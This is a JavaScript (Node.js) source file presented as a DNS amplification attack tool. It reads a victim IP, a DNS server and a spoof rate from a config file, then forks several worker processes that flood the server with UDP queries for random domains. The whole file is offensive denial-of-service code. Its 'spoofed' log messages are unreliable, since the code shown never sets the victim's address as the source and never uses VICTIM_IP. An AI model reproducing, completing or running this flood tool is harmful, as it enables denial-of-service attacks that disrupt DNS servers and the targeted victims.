import dgram from 'dgram';
import cluster from 'cluster';
import os from 'os';
import { generateRandomDomain, createDNSQuery } from './query-generator.js';
import { config } from './config.js';

const { VICTIM_IP, DNS_SERVER_IP, DNS_PORT, SPOOF_RATE, THREADS } = config;

// Function to perform the attack
const attack = () => {
  const socket = dgram.createSocket('udp4');

  setInterval(() => {
    const domain = generateRandomDomain(); // Generate a random domain name
    const query = createDNSQuery(domain);

    // Send the spoofed request
    socket.send(query, 0, query.length, DNS_PORT, DNS_SERVER_IP, (err) => {
      if (err) {
        console.error('Error sending spoofed query:', err.message);
      } else {
        console.log(`Sent spoofed query for domain: ${domain}`);
      }
    });
  }, 1000 / SPOOF_RATE); // Calculate interval based on spoof rate
};

// Use clustering for multi-threaded execution
if (cluster.isMaster) {
  console.log(`Starting DNS Amplification Attack with ${THREADS} threads...`);
  for (let i = 0; i < THREADS; i++) {
    cluster.fork();
  }
} else {
  attack();
}
